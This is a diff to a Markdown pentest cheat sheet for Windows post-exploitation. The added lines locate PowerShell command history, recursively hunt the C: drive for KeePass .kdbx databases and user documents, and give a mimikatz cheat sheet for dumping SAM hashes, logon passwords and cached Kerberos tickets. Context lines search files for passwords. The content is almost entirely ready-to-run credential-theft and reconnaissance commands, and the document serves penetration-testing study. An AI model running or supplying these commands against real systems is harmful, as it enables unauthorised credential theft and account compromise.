@@ -6,6 +6,7 @@
 **liste des connexions:** netstat -ano  
 **infos system:** systeminfo  
 **powershell-history:** type C:\Users\[user]\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt  
+to verify the path of ConsoleHost_history: (Get-PSReadlineOption).HistorySavePath  
   
 **list connected user:**  
 query user  
@@ -52,4 +53,15 @@ dir /s *pass* == *cred* == *vnc* == *.config*
 findstr /spin "password" *.*  
 findstr /spin "password" *.*  
 
+**Kepass File**  
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue  
+  
+All doc file :
+Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+
+## mimikatz.exe cheat sheet
+privilege::debug  -->  engage the SeDebugPrivlege  
+lsadump::sam --> Dump from SAM database
+sekurlsa::logonpasswords --> Dump from Sekurlsa
+sekurlsa::tickets --> Dump cached tickets
 Some source: https://chryzsh.gitbooks.io/pentestbook/content/privilege_escalation_windows.html  
